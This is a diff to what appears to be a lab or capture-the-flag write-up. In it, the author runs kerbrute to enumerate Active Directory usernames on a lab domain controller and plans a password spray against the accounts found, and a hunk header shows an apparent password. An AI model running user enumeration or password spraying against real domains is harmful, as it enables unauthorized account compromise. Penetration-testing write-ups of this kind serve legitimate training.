@@ -245,6 +245,8 @@ fFvq52PzJpO98X8!
 
 I am not given a username so ill use kerbrute to try an enumerate some users
 
+# Password Spray leads to user compromise
+
 ```python
 kerbrute userenum --dc dc01.casper.hsm -d casper.hsm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
 
@@ -268,4 +270,7 @@ Version: v1.0.3 (9dad6e1) - 08/05/26 - Ronnie Flathers @ropnop
 2026/08/05 16:56:08 >  [+] VALID USERNAME:	Administrator@casper.hsm
 ```
 
-Found user `jay` `carlito` 
+Found user `jay` `carlito` and `points`
+
+I can try and spray the password against these users!
+
